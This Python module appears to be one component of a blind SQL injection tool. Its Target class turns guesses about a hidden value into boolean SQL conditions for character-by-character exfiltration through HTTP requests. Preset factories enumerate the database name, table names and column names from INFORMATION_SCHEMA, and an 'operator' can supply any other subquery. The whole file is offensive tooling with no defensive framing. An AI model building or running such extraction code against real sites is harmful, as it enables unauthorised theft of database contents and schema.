"""Extraction targets (the "Oracle / condition generator" layer).

A :class:`Target` wraps a scalar-returning SQL expression and turns *hypotheses*
about its value into boolean SQL conditions, using a dialect. The engine only
ever talks to a Target through this interface, so adding a new thing to extract
(database name, column name, a field value, a COUNT, ...) means constructing a
different Target — no engine changes.

    hypothesis ("char 4 is 'u'" / "value starts with 'jun_'" / "length is 9")
        -> Target                (this module)
        -> boolean SQL condition (dialect)
        -> payload               (payload.py)
        -> HTTP request          (http_client.py)
        -> classifier verdict    (classifier.py)
        -> True / False          (oracle.py)
"""

from __future__ import annotations

from dataclasses import dataclass

from .dialect import SqlDialect


@dataclass
class Target:
    """A single scalar value to exfiltrate character by character."""

    name: str          # label for output, e.g. "TABLE_NAME"
    expression: str    # SQL scalar subquery, e.g. "(SELECT TOP(1) TABLE_NAME ...)"
    dialect: SqlDialect

    # --- character-level hypotheses ----------------------------------------
    def char_is(self, pos: int, ch: str) -> str:
        """Condition: the character at 1-based *pos* equals *ch*."""
        return self.dialect.char_eq(self.expression, pos, ch)

    def char_le(self, pos: int, ch: str) -> str:
        """Condition: the character at *pos* is <= *ch* (for binary search)."""
        return self.dialect.char_le(self.expression, pos, ch)

    # --- sequence-level hypotheses -----------------------------------------
    def substring_is(self, pos: int, value: str) -> str:
        """Condition: the substring starting at *pos* equals *value*.

        Verifies a whole predicted sequence in a single request.
        """
        return self.dialect.substr_eq(self.expression, pos, value)

    def starts_with(self, prefix: str) -> str:
        """Condition: the value begins with *prefix* (LIKE prefix match)."""
        return self.dialect.prefix_like(self.expression, prefix)

    # --- length hypotheses --------------------------------------------------
    def length_is(self, n: int) -> str:
        return self.dialect.length_eq(self.expression, n)

    def length_le(self, n: int) -> str:
        return self.dialect.length_le(self.expression, n)

    def length_ge(self, n: int) -> str:
        return self.dialect.length_ge(self.expression, n)


# --- convenience factories for common metadata targets ---------------------
# These are just preset Target instances; the engine treats them all the same.

def first_table_name(dialect: SqlDialect, offset: int = 0) -> Target:
    """First (offset-th) table name from INFORMATION_SCHEMA (MSSQL-style)."""
    if offset == 0:
        expr = "(SELECT TOP(1) TABLE_NAME FROM INFORMATION_SCHEMA.TABLES ORDER BY TABLE_NAME)"
    else:
        expr = (
            f"(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES ORDER BY TABLE_NAME "
            f"OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)"
        )
    return Target(name=f"TABLE_NAME[{offset}]", expression=expr, dialect=dialect)


def database_name(dialect: SqlDialect) -> Target:
    return Target(name="DB_NAME", expression="(SELECT DB_NAME())", dialect=dialect)


def first_column_name(dialect: SqlDialect, table: str, offset: int = 0) -> Target:
    expr = (
        f"(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS "
        f"WHERE TABLE_NAME = '{table}' ORDER BY ORDINAL_POSITION "
        f"OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)"
    )
    return Target(name=f"COLUMN_NAME[{table}:{offset}]", expression=expr, dialect=dialect)


def custom(dialect: SqlDialect, name: str, expression: str) -> Target:
    """Wrap any scalar-returning subquery the operator supplies."""
    return Target(name=name, expression=expression, dialect=dialect)
